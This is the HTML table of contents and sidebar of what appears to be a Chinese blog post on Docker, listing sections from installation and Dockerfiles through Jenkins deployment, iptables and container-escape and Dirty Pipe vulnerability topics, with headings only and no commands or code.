          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#docker%E4%BB%93%E5%BA%93"><span class="toc-number">2.</span> <span class="toc-text">docker仓库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E7%BD%91%E4%BB%93%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">官网仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#github-docker%E4%BB%93%E5%BA%93"><span class="toc-number">2.2.</span> <span class="toc-text">github docker仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#harbor%E8%87%AA%E5%BB%BA%E4%B8%AA%E4%BA%BA%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93"><span class="toc-number">2.3.</span> <span class="toc-text">harbor自建个人镜像仓库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">2.3.0.2.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">2.3.0.3.</span> <span class="toc-text">使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E5%90%88SpringBoot%E4%BD%BF%E7%94%A8"><span class="toc-number">2.3.0.4.</span> <span class="toc-text">结合SpringBoot使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.3.0.5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">2.3.0.6.</span> <span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E5%9C%B0%E5%9D%80"><span class="toc-number">2.3.0.7.</span> <span class="toc-text">项目源码地址</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#run%E7%9A%84%E6%B5%81%E7%A8%8B%E5%92%8Cdocker%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">run的流程和docker原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81run%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">1、run的流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81docker%E5%8E%9F%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">2、docker原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81docker%E4%B8%BA%E4%BD%95%E6%AF%94VM%E5%BF%AB"><span class="toc-number">3.3.</span> <span class="toc-text">3、docker为何比VM快</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-1"><span class="toc-number">4.</span> <span class="toc-text">安装</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E7%89%88%E6%9C%AC"><span class="toc-number">4.1.</span> <span class="toc-text">docker版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E5%AE%89%E8%A3%85"><span class="toc-number">4.2.</span> <span class="toc-text">windows安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E7%82%B9%EF%BC%9A"><span class="toc-number">4.2.1.</span> <span class="toc-text">重点：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#hyper-v%E5%BC%80%E5%90%AF%EF%BC%9A"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">hyper-v开启：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wsl2%EF%BC%9A"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">wsl2：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">5.</span> <span class="toc-text">虚拟机与容器技术的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%9F"><span class="toc-number">5.0.1.</span> <span class="toc-text">什么是虚拟机？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AE%B9%E5%99%A8%EF%BC%9F"><span class="toc-number">5.0.2.</span> <span class="toc-text">什么是容器？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.0.3.</span> <span class="toc-text">容器类型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-number">6.</span> <span class="toc-text">设置代理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E9%95%9C%E5%83%8F%E8%8E%B7%E5%8F%96%E4%BB%A3%E7%90%86%E9%97%AE%E9%A2%98"><span class="toc-number">6.1.</span> <span class="toc-text">docker镜像获取代理问题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#docker%E5%91%BD%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text">docker命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86"><span class="toc-number">7.1.</span> <span class="toc-text">容器生命周期管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E6%93%8D%E4%BD%9C"><span class="toc-number">7.2.</span> <span class="toc-text">容器操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8rootfs%E5%91%BD%E4%BB%A4"><span class="toc-number">7.3.</span> <span class="toc-text">容器rootfs命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93"><span class="toc-number">7.4.</span> <span class="toc-text">镜像仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E9%95%9C%E5%83%8F%E7%AE%A1%E7%90%86"><span class="toc-number">7.5.</span> <span class="toc-text">本地镜像管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#info-version"><span class="toc-number">7.5.1.</span> <span class="toc-text">info|version</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90docker%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93"><span class="toc-number">7.6.</span> <span class="toc-text">⭐docker命令小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90dockerfile%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">7.7.</span> <span class="toc-text">⭐dockerfile常用命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%AD%90%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%E8%87%B3docker%E5%AE%B9%E5%99%A8"><span class="toc-number">8.</span> <span class="toc-text">⭐本地文件映射至docker容器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">8.1.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E5%AE%B9%E5%99%A8ID"><span class="toc-number">8.2.</span> <span class="toc-text">拿到容器ID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E5%AE%B9%E5%99%A8%E7%9A%84%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E4%B8%AD"><span class="toc-number">8.3.</span> <span class="toc-text">将本地文件上传到容器的指定目录中</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99dockerfile%E6%96%87%E4%BB%B6"><span class="toc-number">9.</span> <span class="toc-text">编写dockerfile文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-number">9.1.</span> <span class="toc-text">步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA-image-%E6%96%87%E4%BB%B6"><span class="toc-number">9.1.1.</span> <span class="toc-text">创建 image 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%AE%B9%E5%99%A8"><span class="toc-number">9.1.2.</span> <span class="toc-text">生成容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD-%E5%91%BD%E4%BB%A4"><span class="toc-number">9.1.3.</span> <span class="toc-text">CMD 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E5%B8%83-image-%E6%96%87%E4%BB%B6"><span class="toc-number">9.1.4.</span> <span class="toc-text">发布 image 文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%8F%E5%B0%91%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%A4%A7%E5%B0%8F"><span class="toc-number">9.2.</span> <span class="toc-text">减少容器镜像大小</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#docker%E5%BC%80%E5%8F%91golang%E9%A1%B9%E7%9B%AE"><span class="toc-number">10.</span> <span class="toc-text">docker开发golang项目</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jenkins-Docker-%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2-SpringBoot-%E9%A1%B9%E7%9B%AE"><span class="toc-number">11.</span> <span class="toc-text">Jenkins+Docker 一键自动化部署 SpringBoot 项目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Jenkins"><span class="toc-number">11.1.</span> <span class="toc-text">安装Jenkins</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AE%89%E8%A3%85Jenkins"><span class="toc-number">11.1.0.1.</span> <span class="toc-text">1.安装Jenkins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%9D%E5%A7%8B%E5%8C%96Jenkins"><span class="toc-number">11.1.0.2.</span> <span class="toc-text">2.初始化Jenkins</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-%E8%A7%A3%E9%94%81Jenkins"><span class="toc-number">11.1.0.2.1.</span> <span class="toc-text">2.1 解锁Jenkins</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6"><span class="toc-number">11.1.0.2.2.</span> <span class="toc-text">2.2 安装插件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-%E5%88%9B%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7"><span class="toc-number">11.1.0.2.3.</span> <span class="toc-text">2.3 创建管理员用户</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE"><span class="toc-number">11.2.</span> <span class="toc-text">三、系统配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AE%89%E8%A3%85%E9%9C%80%E8%A6%81%E6%8F%92%E4%BB%B6"><span class="toc-number">11.2.0.1.</span> <span class="toc-text">1. 安装需要插件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%85%8D%E7%BD%AEMaven"><span class="toc-number">11.2.0.2.</span> <span class="toc-text">2. 配置Maven</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%88%9B%E5%BB%BA%E4%BB%BB%E5%8A%A1"><span class="toc-number">11.3.</span> <span class="toc-text">四、创建任务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%B0%E5%BB%BA%E4%BB%BB%E5%8A%A1"><span class="toc-number">11.3.0.1.</span> <span class="toc-text">1. 新建任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BA%90%E7%A0%81%E7%AE%A1%E7%90%86"><span class="toc-number">11.3.0.2.</span> <span class="toc-text">2. 源码管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9E%84%E5%BB%BA%E8%A7%A6%E5%8F%91%E5%99%A8"><span class="toc-number">11.3.0.3.</span> <span class="toc-text">3.构建触发器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BF%9D%E5%AD%98"><span class="toc-number">11.3.0.4.</span> <span class="toc-text">4. 保存</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%B5%8B%E8%AF%95"><span class="toc-number">11.4.</span> <span class="toc-text">五、测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9E%84%E5%BB%BA"><span class="toc-number">11.4.0.1.</span> <span class="toc-text">1. 构建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E6%97%A5%E5%BF%97"><span class="toc-number">11.4.0.2.</span> <span class="toc-text">2.查看日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8B%E9%A1%B9%E7%9B%AE%E4%BD%8D%E7%BD%AE"><span class="toc-number">11.4.0.3.</span> <span class="toc-text">3. 查看项目位置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E8%BF%90%E8%A1%8C%E9%A1%B9%E7%9B%AE"><span class="toc-number">11.5.</span> <span class="toc-text">六、运行项目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Dockerfile"><span class="toc-number">11.5.0.1.</span> <span class="toc-text">1. Dockerfile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9jenkins%E4%BB%BB%E5%8A%A1%E9%85%8D%E7%BD%AE"><span class="toc-number">11.5.0.2.</span> <span class="toc-text">2. 修改jenkins任务配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BF%9D%E5%AD%98"><span class="toc-number">11.5.0.3.</span> <span class="toc-text">3. 保存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%9E%84%E5%BB%BA"><span class="toc-number">11.5.0.4.</span> <span class="toc-text">4. 构建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E9%AA%8C%E8%AF%81"><span class="toc-number">11.5.0.5.</span> <span class="toc-text">5. 验证</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F"><span class="toc-number">12.</span> <span class="toc-text">逆向容器镜像</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ubuntu%E5%AE%B9%E5%99%A8%E9%80%86%E5%90%91"><span class="toc-number">12.1.</span> <span class="toc-text">Ubuntu容器逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">12.1.1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%9C%E5%83%8F%E5%88%86%E6%9E%90"><span class="toc-number">12.1.2.</span> <span class="toc-text">镜像分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">12.2.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7"><span class="toc-number">12.2.1.</span> <span class="toc-text">其他工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wooyun%E5%AE%B9%E5%99%A8%E9%80%86%E5%90%91"><span class="toc-number">12.3.</span> <span class="toc-text">wooyun容器逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dockerfile"><span class="toc-number">12.3.1.</span> <span class="toc-text">dockerfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%9C%E5%83%8F%E5%88%86%E6%9E%90-1"><span class="toc-number">12.3.2.</span> <span class="toc-text">镜像分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">12.3.3.</span> <span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dive"><span class="toc-number">12.3.3.1.</span> <span class="toc-text">dive</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%94%AE%E7%BB%91%E5%AE%9A"><span class="toc-number">12.3.3.1.1.</span> <span class="toc-text">键绑定</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7-1"><span class="toc-number">12.3.4.</span> <span class="toc-text">其他工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">12.3.5.</span> <span class="toc-text">思考</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-number">12.3.5.1.</span> <span class="toc-text">作用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">12.3.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%B7%A5%E4%BD%9C%E5%9C%A8docker%E7%8E%AF%E5%A2%83"><span class="toc-number">13.</span> <span class="toc-text">判断是否工作在docker环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9A%E5%88%A4%E6%96%AD%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B-dockerenv-%E6%96%87%E4%BB%B6"><span class="toc-number">13.1.</span> <span class="toc-text">方式一：判断根目录下 .dockerenv 文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9A%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E7%9A%84cgroup%E4%BF%A1%E6%81%AF-%E5%88%A4%E6%96%AD%E6%98%AF%E6%9C%BA%E5%AD%90%E8%BF%98%E6%98%AF%E5%AE%B9%E5%99%A8"><span class="toc-number">13.2.</span> <span class="toc-text">方式二：查询系统进程的cgroup信息(判断是机子还是容器)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%89%EF%BC%9A%E5%B8%B8%E8%A7%81%E7%9A%84%E5%91%BD%E4%BB%A4%E5%8D%B4%E6%B2%A1%E6%9C%89"><span class="toc-number">13.3.</span> <span class="toc-text">方式三：常见的命令却没有</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E5%9B%9B%EF%BC%9A%E8%BF%9B%E7%A8%8B%E6%95%B0%E5%BE%88%E5%B0%91%EF%BC%8C%E6%AF%94%E5%A6%82%E5%B0%91%E4%BA%8E10%E6%9D%A1"><span class="toc-number">13.4.</span> <span class="toc-text">方式四：进程数很少，比如少于10条</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shell%E5%88%A4%E6%96%ADdocker%E6%98%AF%E5%90%A6%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E5%AE%B9%E5%99%A8"><span class="toc-number">14.</span> <span class="toc-text">shell判断docker是否运行一个容器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#docker-swarm"><span class="toc-number">15.</span> <span class="toc-text">docker swarm</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#docker-iptables"><span class="toc-number">16.</span> <span class="toc-text">docker iptables</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#iptables"><span class="toc-number">16.1.</span> <span class="toc-text">iptables</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B"><span class="toc-number">16.1.1.</span> <span class="toc-text">处理流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%89%A9%E5%B1%95"><span class="toc-number">16.1.2.</span> <span class="toc-text">命令与扩展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E8%A7%84%E5%88%99"><span class="toc-number">16.1.3.</span> <span class="toc-text">系统默认规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ipset%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">16.1.4.</span> <span class="toc-text">ipset的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SNAT%E4%B8%8EDNAT"><span class="toc-number">16.1.5.</span> <span class="toc-text">SNAT与DNAT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp%E8%A7%84%E5%88%99"><span class="toc-number">16.1.6.</span> <span class="toc-text">ftp规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#firewall-cmd%E5%91%BD%E4%BB%A4"><span class="toc-number">16.1.7.</span> <span class="toc-text">firewall-cmd命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E7%9A%84iptables%E8%A7%84%E5%88%99"><span class="toc-number">16.2.</span> <span class="toc-text">docker的iptables规则</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E7%BD%91%E7%BB%9C%E7%B1%BB%E5%9E%8B"><span class="toc-number">16.2.1.</span> <span class="toc-text">docker网络类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B"><span class="toc-number">16.2.2.</span> <span class="toc-text">数据包处理流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter%E8%A1%A8%E8%A7%84%E5%88%99"><span class="toc-number">16.2.3.</span> <span class="toc-text">filter表规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nat%E8%A1%A8%E8%A7%84%E5%88%99"><span class="toc-number">16.2.4.</span> <span class="toc-text">nat表规则</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#docker%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">17.</span> <span class="toc-text">docker漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#unauthorized-rce-%EF%BC%88%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">17.1.</span> <span class="toc-text">unauthorized-rce （未授权访问命令执行）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">17.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">17.1.2.</span> <span class="toc-text">搭建环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">17.1.3.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">17.1.4.</span> <span class="toc-text">nc监听端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">17.1.5.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">17.1.6.</span> <span class="toc-text">漏洞挖掘</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E6%9C%8D%E5%8A%A1%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E9%80%83%E9%80%B8"><span class="toc-number">17.2.</span> <span class="toc-text">docker服务访问限制逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">17.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">17.2.2.</span> <span class="toc-text">例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">17.2.3.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7"><span class="toc-number">18.</span> <span class="toc-text">容器渗透工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CDK%EF%BC%9Adocker%E9%80%83%E9%80%B8"><span class="toc-number">18.1.</span> <span class="toc-text">CDK：docker逃逸</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2022-0847%EF%BC%9A%E8%84%8F%E7%AE%A1%E9%81%93%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AF%B9%E5%AE%B9%E5%99%A8%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">19.</span> <span class="toc-text">CVE-2022-0847：脏管道漏洞分析及对容器的影响</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">19.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">19.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%8F%E7%AE%A1%E9%81%93%E5%AF%B9Linux%E5%AE%B9%E5%99%A8%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">19.3.</span> <span class="toc-text">脏管道对Linux容器的影响</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-1"><span class="toc-number">19.4.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="qingjiegong"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">qingjiegong</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">2</span>
        <span class="name">文章</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL01yLXFpbmdqaWVnb25n" title="https:&#x2F;&#x2F;github.com&#x2F;Mr-qingjiegong"><i class="ic i-github"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
